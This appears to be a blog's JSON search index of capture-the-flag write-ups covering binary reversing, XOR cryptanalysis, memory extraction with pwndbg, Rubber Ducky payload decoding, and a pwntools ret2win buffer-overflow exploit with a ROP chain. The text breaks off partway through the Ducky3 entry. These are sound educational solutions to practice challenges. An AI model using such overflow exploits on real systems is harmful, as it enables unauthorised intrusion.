
{
    
    
    
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
    "pages": [{"date":"2023-12-20","image":"","imageAlt":"","link":"https://treseco.github.io/pages/about/","summary":"About Me I am currently an undergraduate student at The University of Michigan studying computer science. I also compete in Capture the Flag cybersecurity competitions with Wolvsec.\nAbout This Site This site is intented to be a place to share write-ups for CTF challenge solutions as well as updates for my personal projects.\nThis site is built with static site generator hugo and uses a modified version of hugo-ficurinia as a theme.","tags":[],"text":"about me i am currently an undergraduate student at the university of michigan studying computer science. i also compete in capture the flag cybersecurity competitions with wolvsec.\nabout this site this site is intented to be a place to share write-ups for ctf challenge solutions as well as updates for my personal projects.\nthis site is built with static site generator hugo and uses a modified version of hugo-ficurinia as a theme. it is hosted with github pages.\n","title":"About"},{"date":"2023-09-03","image":"","imageAlt":"","link":"https://treseco.github.io/posts/ductf23/masked_squares_flag_checker/","summary":"Masked Squares Flag Checker Author: joseph Category: rev Difficulty: easy Points: 218 Solves: 62 Description This program checks the flag based on some simple arithmetic operations.\nFiles ms_flag_checker - ms_flag_checker: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a8e81b5edf26d75633d7f857771172e81689a563, for GNU/Linux 4.4.0, stripped\nSolve Begin by decompiling main with ghidra and cleaning up the code.\nundefined8 main(void) { long mask_ptr; byte *mask_info; int *sum_target_ptr; int masked_sum; int flag_ints [36]; char buf [40]; .","tags":["ctf write-up","DUCTF 2023","reversing"],"text":"masked squares flag checker author: joseph category: rev difficulty: easy points: 218 solves: 62 description this program checks the flag based on some simple arithmetic operations.\nfiles ms_flag_checker - ms_flag_checker: elf 64-bit lsb pie executable, x86-64, version 1 (sysv), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, buildid[sha1]=a8e81b5edf26d75633d7f857771172e81689a563, for gnu/linux 4.4.0, stripped\nsolve begin by decompiling main with ghidra and cleaning up the code.\nundefined8 main(void) { long mask_ptr; byte *mask_info; int *sum_target_ptr; int masked_sum; int flag_ints [36]; char buf [40]; ... //prompt for flag, read in flag //convert flag chars to ints and store in flag_ints[36] ... mask_info = mask_info_begin; sum_target_ptr = target_sums_begin; do { mask_ptr = make_mask((byte *)mask_info); masked_sum = sum_with_mask(flag_ints,mask_ptr); if (*sum_target_ptr != masked_sum) { puts(\u0026#34;incorrect!\u0026#34;); exit(-1); } mask_info = mask_info[1]; sum_target_ptr = sum_target_ptr + 1; } while (mask_info != (byte (*) [24])\u0026amp;mask_info_end); puts(\u0026#34;correct!\u0026#34;); } the main() function of the binary gives us a clear understanding of what this program does. we just need to pass the check in every loop iteration. the output of the function we will call sum_with_mask() needs to match some value stored in the program data. we can see what sum_with_mask() does.\nint sum_with_mask(int *flag_ints,long mask_ptr) { long idx; int sum; long row_end; row_end = 24; sum = 0; do { idx = row_end + -24; do { if (*(int *)(mask_ptr + idx) != 0) { sum = sum + *(int *)((long)flag_ints + idx); } idx = idx + 4; } while (idx != row_end); row_end = row_end + 24; } while (row_end != 168); return sum; } this function simply calculates the sum of all elements of flag_ints where the corresponding element in the mask is non-zero. we know that the return value of this function is what is checked in the flag check, and the desired sum is stored in the program data. using this information we can get the flag knowing what subsets of flag characters sum to what value. we just need all the different character subsets and with the correct sums. in order to find the character subsets we first need the masks, so we need to look at make_mask().\nvoid make_mask(byte *mask_info) { void *mask_ptr; int iterations; int offset; int col; int row; int byte_val; byte *next_byte; bool byte_lte_0; byte mask_byte; mask_ptr = malloc(144); mask_byte = *mask_info; if (mask_byte != 0) { next_byte = mask_info + 1; row = 0; col = 0; do { byte_val = (int)(char)mask_byte; byte_lte_0 = byte_val \u0026lt; 1; if (byte_lte_0) { byte_val = -byte_val; } iterations = 0; offset = col; do { col = offset + 1; *(uint *)((long)mask_ptr + ((long)offset + (long)row * 6) * 4) = (uint)!byte_lte_0; if (col == 6) { row = row + 1; col = 0; } iterations = iterations + 1; offset = col; } while (byte_val != iterations); mask_byte = *next_byte; next_byte = next_byte + 1; } while (mask_byte != 0); } return; } this function allocates space for a mask on the heap, then reads each byte from mask_info. each byte is interpreted as two\u0026rsquo;s complement. the absolute value of the byte determines how many bits to add to the mask. the sign of the byte determines if those bits are 1 or 0, 1 for positive, 0 for negative. now that we have this figured out, we can get all the masks from the mask_info in the program data. then we can use z3 to add each sum as a constraint on the flag and solve.\nfrom z3 import * # data from ghidra @00104060. array of ints that the sum of the flag chars # is checked against after being masked. target_sums_bytes = b\u0026#39;\\xa1\\x05\\x00\\x00\\xfb\\x07\\x00\\x00\\xeb\\x04\\x00\\x00\\xef\\x07\\x00\\x00\\x07\\x07\\x00\\x00\\xea\\x02\\x00\\x00\\x37\\x00\\x00\\x00\\xaa\\x05\\x00\\x00\\xcd\\x05\\x00\\x00\\x52\\x05\\x00\\x00\\x63\\x02\\x00\\x00\\x22\\x05\\x00\\x00\\x66\\x01\\x00\\x00\\x2a\\x07\\x00\\x00\\xdc\\x05\\x00\\x00\\x4b\\x05\\x00\\x00\\xdb\\x07\\x00\\x00\\xc6\\x07\\x00\\x00\\x93\\x07\\x00\\x00\\xc6\\x07\\x00\\x00\\x16\\x01\\x00\\x00\\x43\\x07\\x00\\x00\\x3f\\x08\\x00\\x00\\xe6\\x05\\x00\\x00\\x78\\x03\\x00\\x00\\xc8\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39; # data from ghidra @001040e0. array of arrays of bytes used to generate masks mask_info = b\u0026#39;\\xfb\\x01\\xfe\\x01\\xff\\x03\\xfd\\x02\\xff\\x01\\xff\\x01\\xff\\x01\\xff\\x02\\xfd\\x02\\xfe\\x02\\x00\\x00\\x00\\x00\\xff\\x01\\xfd\\x02\\xfd\\x02\\xff\\x01\\xfe\\x03\\xff\\x01\\xff\\x07\\xff\\x03\\xff\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\x01\\xff\\x01\\xff\\x02\\xff\\x01\\xfa\\x01\\xff\\x01\\xfe\\x01\\xff\\x01\\xff\\x01\\xfc\\x03\\xff\\x01\\xfe\\x00\\x02\\xff\\x05\\xfd\\x03\\xff\\x04\\xff\\x02\\xff\\x05\\xfd\\x02\\xfd\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\x01\\xfd\\x01\\xff\\x01\\xfe\\x01\\xff\\x03\\xff\\x01\\xff\\x01\\xfe\\x05\\xff\\x04\\xff\\x01\\xfd\\x00\\x00\\x00\\x01\\xfe\\x02\\xf8\\x01\\xf9\\x02\\xff\\x01\\xfd\\x01\\xfe\\x01\\xfc\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xeb\\x01\\xf2\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xfe\\x03\\xfc\\x04\\xfb\\x01\\xfe\\x01\\xff\\x01\\xfe\\x01\\xfe\\x01\\xff\\x04\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xfc\\x05\\xfd\\x01\\xfb\\x01\\xfd\\x01\\xfe\\x05\\xfc\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\x02\\xfc\\x01\\xff\\x04\\xfd\\x01\\xfc\\x01\\xff\\x02\\xff\\x01\\xfd\\x01\\xff\\x02\\xfe\\x00\\x00\\x00\\x00\\x00\\xfe\\x01\\xf8\\x01\\xff\\x01\\xfd\\x01\\xff\\x01\\xf9\\x01\\xf8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\xfe\\x05\\xff\\x01\\xf8\\x03\\xfe\\x01\\xfe\\x01\\xfd\\x01\\xfc\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xfd\\x01\\xf7\\x01\\xfe\\x01\\xef\\x01\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\xfb\\x04\\xff\\x01\\xfe\\x01\\xff\\x02\\xfd\\x03\\xff\\x01\\xff\\x03\\xff\\x02\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\xfe\\x02\\xfd\\x01\\xff\\x01\\xff\\x01\\xff\\x01\\xf9\\x01\\xff\\x06\\xff\\x03\\xff\\x01\\xff\\x00\\x00\\x00\\x00\\x00\\x01\\xfb\\x01\\xfe\\x02\\xff\\x02\\xff\\x01\\xff\\x01\\xfb\\x01\\xff\\x01\\xff\\x05\\xfc\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\xfd\\x01\\xfb\\x04\\xfe\\x03\\xfe\\x05\\xff\\x02\\xff\\x02\\xff\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\x01\\xfd\\x01\\xff\\x02\\xfe\\x01\\xff\\x07\\xfe\\x03\\xff\\x04\\xff\\x01\\xfe\\x01\\xff\\x00\\x00\\x00\\x00\\x00\\x02\\xff\\x01\\xfe\\x02\\xff\\x02\\xfe\\x05\\xff\\x01\\xff\\x02\\xfd\\x02\\xff\\x01\\xfe\\x02\\xff\\x01\\x00\\x00\\x00\\x01\\xfd\\x03\\xff\\x01\\xfe\\x01\\xff\\x06\\xff\\x01\\xff\\x02\\xfe\\x01\\xff\\x01\\xff\\x03\\xff\\x02\\x00\\x00\\x00\\xf7\\x01\\xf7\\x01\\xfb\\x01\\xf6\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\xff\\x02\\xfe\\x01\\xff\\x09\\xff\\x01\\xff\\x01\\xf9\\x02\\xfe\\x01\\xfe\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\x09\\xff\\x03\\xff\\x06\\xff\\x01\\xff\\x01\\xfe\\x01\\xfd\\x01\\xfc\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xfe\\x01\\xfd\\x01\\xff\\x02\\xfb\\x06\\xff\\x02\\xfe\\x04\\xff\\x01\\xfc\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xfe\\x01\\xfc\\x01\\xff\\x01\\xfe\\x01\\xfd\\x01\\xfd\\x01\\xfd\\x03\\xfa\\x01\\xfe\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf8\\x04\\xfe\\x02\\xff\\x03\\xfb\\x01\\xfe\\x02\\xff\\x01\\xfc\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39; # convert bytes to integers target_sums = [int.from_bytes(target_sums_bytes[i:i+4], \u0026#39;little\u0026#39;) for i in range(0, len(target_sums_bytes), 4)] # process mask info to generate masks as done in func @00101189 # for each 2\u0026#39;s complement byte in mask info, sign determines 1 or 0 in mask # value determines how many 1s or 0s to add to append to the mask masks = [] for i in range(0, len(mask_info), 24): mask = [] for j in range(i, i+24): signed_val = mask_info[j] - 256 if mask_info[j] \u0026gt;= 128 else mask_info[j] if signed_val == 0: break elif signed_val \u0026lt;= 0: for k in range(0, abs(signed_val)): mask.append(0) else: for k in range(0, abs(signed_val)): mask.append(1) masks.append(mask) s = solver() # 36 z3 vars, one for each char in the flag input x = [ int(\u0026#39;x%s\u0026#39; % i) for i in range(36)] # only int values of printable ascii s.add([ and(x[i] \u0026gt;= 0, x[i] \u0026lt; 127) for i in range(36)]) # assume flag prefix s.add(x[0]==68) #d s.add(x[1]==85) #u s.add(x[2]==67) #c s.add(x[3]==84) #t s.add(x[4]==70) #f s.add(x[5]==123)#{ # add sum constraint for each mask based on required sum in target_sums and # summands specified by the mask for i, m in enumerate(masks): s.add(target_sums[i]==sum([ if(b!=0, x[j], 0) for j , b in enumerate(m)])) print(s.check()) print(s.model()) # print flag for c in [ s.model().evaluate(x[i]) for i in range(36) ] : print(chr(c.as_long()), end=\u0026#39;\u0026#39;) print() ductf{ezzzpzzz_07bcda7bfe81faf43caa}\n","title":"Masked Squares Flag Checker"},{"date":"2023-09-03","image":"","imageAlt":"","link":"https://treseco.github.io/posts/ductf23/other/","summary":"All Fathers Wisdom Author: Pix Category: rev Difficulty: beginner Points: 100 Solves: 270 Description We found this binary in the backroom, its been marked as \u0026ldquo;The All Fathers Wisdom\u0026rdquo; - See hex for further details. Not sure if its just old and hex should be text, or they mean the literal hex.\nAnyway can you get this \u0026lsquo;wisdom\u0026rsquo; out of the binary for us?\nFiles the-all-fathers-wisdom - ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.","tags":["ctf write-up","DUCTF 2023","misc","OSINT","reversing"],"text":"all fathers wisdom author: pix category: rev difficulty: beginner points: 100 solves: 270 description we found this binary in the backroom, its been marked as \u0026ldquo;the all fathers wisdom\u0026rdquo; - see hex for further details. not sure if its just old and hex should be text, or they mean the literal hex.\nanyway can you get this \u0026lsquo;wisdom\u0026rsquo; out of the binary for us?\nfiles the-all-fathers-wisdom - elf 64-bit lsb executable, x86-64, version 1 (sysv), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, buildid[sha1]=01eec917a381d4efe62ed137f1349127f4faeeaa, for gnu/linux 4.4.0, not stripped\nsolve the given file still includes the function names, so when we decompile it doesn\u0026rsquo;t take long to find the function main.print_flag():\nvoid main.print_flag(undefined8 flag) { uint xor_res; undefined local_228 [16]; undefined local_218 [16]; undefined local_208 [16]; long i; undefined8 *end; long bound; undefined8 local_1d8; ... undefined8 local_8; undefined8 *end_ptr; long j; local_8 = 0x75; local_10 = 0x26; ... local_1d0 = 0x25; local_1d8 = 0x25; end = \u0026amp;local_1d8; bound = 59; for (i = 0; end_ptr = end, j = i, i \u0026lt; bound; i = i + 1) { runtime.bounds_check_error(); xor_res = *(uint *)(end_ptr + j) ^ 0x11; local_228 = concat88(0x4200000000000001,\u0026amp;xor_res); local_218 = concat88(0x4200000000000001,\u0026amp;xor_res); local_208 = concat88(1,local_218); fmt.printf(\u0026#34;%c\u0026#34;,2,local_218,1,flag); } return; } this function has many local variables that are assigned values. the for loop interates over the values, xors them with 0x11, then prints them. we can can copy these values into a python script to compute the xor and print the flag.\n# byte values in the local vars in main.print_flag() from ghidra bytes=b\u0026#39;\\x75\\x26\\x31\\x22\\x25\\x31\\x77\\x24\\x31\\x25\\x26\\x31\\x21\\x22\\x31\\x74\\x25\\x31\\x75\\x23\\x31\\x22\\x24\\x31\\x20\\x22\\x31\\x77\\x24\\x31\\x74\\x27\\x31\\x20\\x22\\x31\\x25\\x27\\x31\\x77\\x25\\x31\\x73\\x26\\x31\\x27\\x25\\x31\\x25\\x24\\x31\\x22\\x25\\x31\\x24\\x24\\x31\\x25\\x25\u0026#39; decode = \u0026#34;\u0026#34; # xor each byte and append it to decode. ignore spaces. for b in bytes: if b != 49: decode += chr(b ^ 17) # reverse the string. the program loops opposite to how we copied the data decode = decode[-1:: -1] # convert the decoded hex codes into ascii and print for i in range(0, len(decode), 2): print(chr(int(decode[i:i+2], 16)), end=\u0026#39;\u0026#39;) print() ductf{od1n_1s-n0t_c}\nmonke bars author: ghostccamm category: osint difficulty: easy points: 100 solves: 281 description i will be dropping my new track monke bars soon! but i suck at rap and don\u0026rsquo;t want to share it\u0026hellip;\ncan you find the song?\nnote: flag is in the format ductf{...} with no spaces and all lowercase between the {} characters. e.g. ductf{icannotrap}\nsolve the description tells us we need to find a song monke bars, and that the artist is not so good. a search on soundcloud for \u0026ldquo;monke bars\u0026rdquo; yields a song were the artist has left the comment: d-u-c-t-f left curly bracket smack it hack it drop that packet crack this track right curly bracket. from this we can get the flag.\nductf{smackithackitdropthatpacketcrackthistrack}\nmy first c program author: pix category: misc difficulty: easy points: 100 solves: 315 description i decided to finally sit down and learn c, and i don\u0026rsquo;t know what all the fuss is about this language it writes like a dream!\nhere is my first challenge in c! its really easy after you install the c installer installer, after that you just run it and you\u0026rsquo;re free to fly away with the flag like a berd!\nfiles my_first_c_prog.c - ascii text\nsolve my_first_c_prog.c contains a poorly written program in c. the program first sets the values of some variables and then prints out the flag by combining the values of the variables in the following function:\nunion print_flag(end, middle, secondmiddle, start, realstart) =\u0026gt; { print(\u0026#34;the flag is:\u0026#34;)! print(\u0026#34;ductf{${start}_${realstart}_${end}_${secondmiddle}_1s_${middle}_c}\u0026#34;)!!! } ... // now to print the flag for the ctf!! print_flag(thank, vars[-1], end, heck_eight, ntino) for each argument to the print_flag function we can determine its value by interpreting and correcting the rest of the program.\nductf{i_d0nt_th1nk_th15_1s_r34l_c}\n","title":"DUCTF solves"},{"date":"2023-05-23","image":"","imageAlt":"","link":"https://treseco.github.io/posts/ritsecctf23/either_or_neither_nor/","summary":"Either or Neither nor Category: crypto Points: 100 Files chal.py - Python script, ASCII text executable\nSolve The contents of chal.py tell us that the flag has been xored with a key and we only have the resulting encrypted flag.\n#! /usr/bin/env python flag = \u0026#34;XXXXXXXXXXXXXXXXXXXXX\u0026#34; enc_flag = [91,241,101,166,85,192,87,188,110,164,99,152,98,252,34,152,117,164,99,162,107] key = [0, 0, 0, 0] KEY_LEN = 4 # Encrypt the flag for idx, c in enumerate(flag): enc_flag = ord(c) ^ key[idx % len(key)] The xor operation has properties that make it simple to reverse.","tags":["cryptography","ctf write-up","Ritsec CTF 2023"],"text":"either or neither nor category: crypto points: 100 files chal.py - python script, ascii text executable\nsolve the contents of chal.py tell us that the flag has been xored with a key and we only have the resulting encrypted flag.\n#! /usr/bin/env python flag = \u0026#34;xxxxxxxxxxxxxxxxxxxxx\u0026#34; enc_flag = [91,241,101,166,85,192,87,188,110,164,99,152,98,252,34,152,117,164,99,162,107] key = [0, 0, 0, 0] key_len = 4 # encrypt the flag for idx, c in enumerate(flag): enc_flag = ord(c) ^ key[idx % len(key)] the xor operation has properties that make it simple to reverse. if a ^ b = c then c ^ b = a. because we have the encrypted flag, and the encrypted bytes are equal to f ^ k where f and k are the flag bytes and the key bytes respectively, we can figure out bytes of the flag from bytes of the key and vice versa. because we know the flag format is \u0026lsquo;metactf{}\u0026rsquo;, we can find the key by individually xoring the first four bytes of the encrypted flag with the known first four bytes of the flag \u0026lsquo;meta\u0026rsquo;.\n# encrypted flag enc_flag = [91,241,101,166,85,192,87,188,110,164,99,152,98,252,34,152,117,164,99,162,107] key = [0, 0, 0, 0] # calculate key from enc_flag and known start of flag key[0] = enc_flag[0] ^ ord(\u0026#39;m\u0026#39;) key[1] = enc_flag[1] ^ ord(\u0026#39;e\u0026#39;) key[2] = enc_flag[2] ^ ord(\u0026#39;t\u0026#39;) key[3] = enc_flag[3] ^ ord(\u0026#39;a\u0026#39;) # print decrypted flag for idx, c in enumerate(enc_flag): print(chr(c ^ key[idx % len(key)]), end=\u0026#39;\u0026#39;) print() flag: metactf{x0r_th3_c0re}\n","title":"Either or Neither nor"},{"date":"2023-05-23","image":"","imageAlt":"","link":"https://treseco.github.io/posts/ritsecctf23/jurassic_park/","summary":"Jurassic park Category: Rev Points: 294 Files JuarrasicPark - JurassicPark: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=4XMyVkn0sTek7nw8EEYU/QdfCrifAK-NMKTlAgud5/tWG5xm3UkP6nAyK9dh6I/QDTAn6gKrQy1Vt4Cl8mo, with debug_info, not stripped\nSolve I was not the first on my team to solve this challenge, but didn\u0026rsquo;t notice until I had solved it. I feel it is still worth documenting this method of extracting a file from memory with pwndbg.\nIn main we find a call to embed.","tags":["ctf write-up","reversing","Ritsec CTF 2023"],"text":"jurassic park category: rev points: 294 files juarrasicpark - jurassicpark: elf 64-bit lsb executable, x86-64, version 1 (sysv), statically linked, go buildid=4xmyvkn0stek7nw8eeyu/qdfcrifak-nmktlagud5/twg5xm3ukp6nayk9dh6i/qdtan6gkrqy1vt4cl8mo, with debug_info, not stripped\nsolve i was not the first on my team to solve this challenge, but didn\u0026rsquo;t notice until i had solved it. i feel it is still worth documenting this method of extracting a file from memory with pwndbg.\nin main we find a call to embed.fs.readfile being called on a file called flag.png\n│ ┌─\u0026gt; 0x0048e500 cmp rsp, qword [r14 + 0x10] │ ┌──\u0026lt; 0x0048e504 jbe 0x48e615 │ │╎ 0x0048e50a sub rsp, 0x70 │ │╎ 0x0048e50e mov qword [var_8h], rbp │ │╎ 0x0048e513 lea rbp, [var_8h] │ │╎ 0x0048e518 mov rax, qword obj.main.f │ │╎ 0x0048e51f lea rbx, str.flag.png ; 0x4a828a │ │╎ 0x0048e526 mov ecx, 8 ; int64_t arg_20h │ │╎ 0x0048e52b call sym.embed.fs.readfile ... running the executable with gdb we can step to the instruction right after the call to readfile. $rax now points to the start of the file but we don\u0026rsquo;t know where it ends. the end can be found by searching for the \u0026lsquo;iend\u0026rsquo; string in memory which will mark the end of png files. 0x444e4549 are the bytes that we are looking for.\npwndbg\u0026gt; hexdump $rax +0000 0xc000070000 89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 │.png....│....ihdr│ +0010 0xc000070010 00 00 03 ba 00 00 00 f9 08 06 00 00 00 09 20 49 │........│.......i│ +0020 0xc000070020 32 00 00 2c ea 49 44 41 54 78 5e ed dd 07 d8 34 │2..,.ida│tx^....4│ +0030 0xc000070030 eb 59 17 f0 fb 04 10 01 41 10 42 87 f3 26 48 42 │.y......│a.b..\u0026amp;hb│ pwndbg\u0026gt; find $rax, +0xffffffff, 0x444e4549 0xc000072d1b warning: unable to access 16000 bytes of target memory at 0xc003ffc71f, halting search. 1 pattern found. pwndbg\u0026gt; dump binary memory dump.bin $rax 0xc000072d2b pwndbg\u0026gt; dumping the memory from $rax to a bit past the \u0026lsquo;iend\u0026rsquo; string will give us the flag.png and the image contains the flag.\nflag: rs{g0_3mb3d_th3_flag}\n","title":"Jurassic Park"},{"date":"2023-05-23","image":"","imageAlt":"","link":"https://treseco.github.io/posts/ritsecctf23/ret2win/","summary":"ret2win Pwn 83 pts Description Are you looking for an exploit dev job. Well apply to the Republic of Potatoes. We are looking for the best hackers out there. Download the binary, find the secret door and remember to pass the right password.\nFiles ret2win - ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6407290ddc178ebcff6a243a585c21e8c32a440b, for GNU/Linux 3.2.0, not stripped\nSolve #!/usr/bin/python3 from pwn import * context.","tags":["ctf write-up","pwn","Ritsec CTF 2023"],"text":"ret2win pwn 83 pts description are you looking for an exploit dev job. well apply to the republic of potatoes. we are looking for the best hackers out there. download the binary, find the secret door and remember to pass the right password.\nfiles ret2win - elf 64-bit lsb executable, x86-64, version 1 (sysv), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, buildid[sha1]=6407290ddc178ebcff6a243a585c21e8c32a440b, for gnu/linux 3.2.0, not stripped\nsolve #!/usr/bin/python3 from pwn import * context.binary=\u0026#39;./ret2win\u0026#39; context.terminal= [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-v\u0026#39;] if args[\u0026#39;remote\u0026#39;]: p = remote(\u0026#39;ret2win.challenges.ctf.ritsec.club\u0026#39;, 1337) else: p = process(\u0026#39;./ret2win\u0026#39;) #p = gdb.debug(\u0026#39;./ret2win\u0026#39;, \u0026#39;\u0026#39;\u0026#39; # starti #\u0026#39;\u0026#39;\u0026#39;) e = elf(\u0026#39;./ret2win\u0026#39;) win = e.sym.supersecrettoplevelfunction p.recvuntil(b\u0026#39;(rop)\\n\u0026#39;) #does not work on remote, buffer not flushed? p.sendline(40*b\u0026#39;a\u0026#39;+p64(0x4012b3)+p64(0xcafebabe)+p64(0x4012b1)+p64(0xc0debabe)+p64(0xffffffff)+p64(win)) p.interactive() ","title":"ret2win"},{"date":"2023-05-22","image":"","imageAlt":"","link":"https://treseco.github.io/posts/byuctf23/ducky1/","summary":"Ducky1 Category: Rev Difficulty: Easy Points: 100 Solves: 185 Description I recently got ahold of a Rubber Ducky, and have started automating ALL of my work tasks with it! You should check it out!\nFiles inject.bin - data\nSolve The contents of inject.bin dosn\u0026rsquo;t give us much information.\n$ xxd inject.bin 00000000: 00ff 00ff 00ff 00ff 00ff 00ff 00ff 00ff ................ ... 00000350: 00ff 00ff 00ff 00ff 00ff 00ff 00ff 005f .","tags":["BYUCTF 2023","ctf write-up","reversing"],"text":"ducky1 category: rev difficulty: easy points: 100 solves: 185 description i recently got ahold of a rubber ducky, and have started automating all of my work tasks with it! you should check it out!\nfiles inject.bin - data\nsolve the contents of inject.bin dosn\u0026rsquo;t give us much information.\n$ xxd inject.bin 00000000: 00ff 00ff 00ff 00ff 00ff 00ff 00ff 00ff ................ ... 00000350: 00ff 00ff 00ff 00ff 00ff 00ff 00ff 005f ..............._ 00000360: 0500 1c00 1800 0600 1700 0900 2f02 1700 ............/... 00000370: 0b00 0c00 1600 2d02 1a00 0400 1600 2d02 ......-.......-. 00000380: 0d00 1800 1600 1700 2d02 0400 1100 2d02 ........-.....-. 00000390: 0c00 1100 1700 1500 1200 2d02 0400 0f00 ..........-..... 000003a0: 1500 0c00 0a00 0b00 1700 3802 3802 3002 ..........8.8.0. the description tells us that this file is a \u0026ldquo;rubber ducky\u0026rdquo;, and resarching this tells us that a rubber ducky is keyboard device that appears like a usb drive and sends a keystroke payload when pluged into a computer. further research shows some tools that can be used to encode and decode these rubber ducky payloads, such as ducktoolkit. using ducktoolkit we can decode inject.bin.\n$ python3 ducktools.py -d -l us ../inject.bin /dev/stdout [+] reading duck bin file [-] decoding file [-] writing ducky text to /dev/stdout delay byuctf{this_was_just_an_intro_alright??}[+] process complete after decoding we get the flag. byuctf{this_was_just_an_intro_alright??}\n","title":"Ducky1"},{"date":"2023-05-22","image":"","imageAlt":"","link":"https://treseco.github.io/posts/byuctf23/ducky2/","summary":"#writeup\nDucky2 Category: Rev Difficulty: Medium Points: 476 Solves: 36 Description Okay, turnsk out that wask too easy to decode. You skhoud definitely try thisk one now! (Note - Ducky3 is unlocked after solving this challenge)\nFiles inject.bin - data\nSolve We are given a very similar file to inject.bin from ducky1. Let\u0026rsquo;s try to decode this one with DuckToolkit as well.\n$ python3 ducktools.py -d -l us ../inject.bin /dev/stdout [+] Reading Duck Bin file [-] Decoding file [-] Writing ducky text to /dev/stdout DELAY bzuctfmakesurezourkezboardissetupright|_}|\u0026#34;}|[+] Process Complete Ok, that didn\u0026rsquo;t seem to work but it does give us a hint by telling us to \u0026lsquo;make sure your keyboard is set up right\u0026rsquo;.","tags":["BYUCTF 2023","ctf write-up","reversing"],"text":"#writeup\nducky2 category: rev difficulty: medium points: 476 solves: 36 description okay, turnsk out that wask too easy to decode. you skhoud definitely try thisk one now! (note - ducky3 is unlocked after solving this challenge)\nfiles inject.bin - data\nsolve we are given a very similar file to inject.bin from ducky1. let\u0026rsquo;s try to decode this one with ducktoolkit as well.\n$ python3 ducktools.py -d -l us ../inject.bin /dev/stdout [+] reading duck bin file [-] decoding file [-] writing ducky text to /dev/stdout delay bzuctfmakesurezourkezboardissetupright|_}|\u0026#34;}|[+] process complete ok, that didn\u0026rsquo;t seem to work but it does give us a hint by telling us to \u0026lsquo;make sure your keyboard is set up right\u0026rsquo;. ducktoolkit does give us the option of decoding using different languages so this is something to try. we just need to determine what language this could be.\nmost characters seem to decode correctly, we can see that \u0026lsquo;bzuctf\u0026rsquo; is probably supposed to be \u0026lsquo;byuctf\u0026rsquo;. by compareing the data in inject.bin from ducky1 to the data in inject.bin from ducky2, we can determine what keycodes should print what characters. using the language files in ducktoolkit/ducktoolkit/languages will be helpful for figuring out the keycodes.\n[!warning] installing ducktoolkit via pip will not include all of the language files in the github repo, so it is advised to install from github for this challenge.\nducky1 inject.bin with lang = \u0026lsquo;us\u0026rsquo;:\n00000360: 0500 1c00 1800 0600 1700 0900 2f02 -\u0026gt; decodes to -\u0026gt; \u0026#39;byuctf{\u0026#39; b y u c t f { ducky2 inject.bin with lang = ?:\n00000360: 0500 1d00 1800 0600 1700 0900 0505 -\u0026gt; decodes to -\u0026gt; \u0026#39;bzuctf\u0026#39; b z(y) u c t f ({) we can see that the language we need encodes \u0026lsquo;{\u0026rsquo; as \u0026lsquo;0505\u0026rsquo;, so the correct language will have this line in the language file: \u0026quot;{\u0026quot;:\u0026quot;05,00,05\u0026quot;,\nit turns out there are two languages, czech and slovak, that have this property and decode the payload without issues.\n$ python3 ducktools.py -d -l cz ../inject.bin /dev/stdout [+] reading duck bin file [-] decoding file [-] writing ducky text to /dev/stdout delay byuctf{makesureyourkeyboardissetupright\u0026#39;@\u0026amp;%(#@\u0026#39;!(#*$\u0026#39;}[+] process complete $ python3 ducktools.py -d -l sk ../inject.bin /dev/stdout [+] reading duck bin file [-] decoding file [-] writing ducky text to /dev/stdout delay byuctf{makesureyourkeyboardissetupright)@\u0026amp;%(#@)!(#*$)}[+] process complete aside from the numerous intentional \u0026lsquo;sk\u0026rsquo; typos in the challenge description, it is not obvious which flag is correct but trying both will reveal the correct flag. byuctf{makesureyourkeyboardissetupright)@\u0026amp;%(#@)!(#*$)}\n","title":"Ducky2"},{"date":"2023-05-22","image":"","imageAlt":"","link":"https://treseco.github.io/posts/byuctf23/ducky3/","summary":"Ducky3 Category: Rev Difficulty: Medium Points: 497 Solves: 14 Description Alright fine, I\u0026rsquo;ll make my own keyboard layout\u0026hellip;\nFiles inject.bin - data payload.txt - ASCII text\nSolve This challenge only provided another inject.bin file 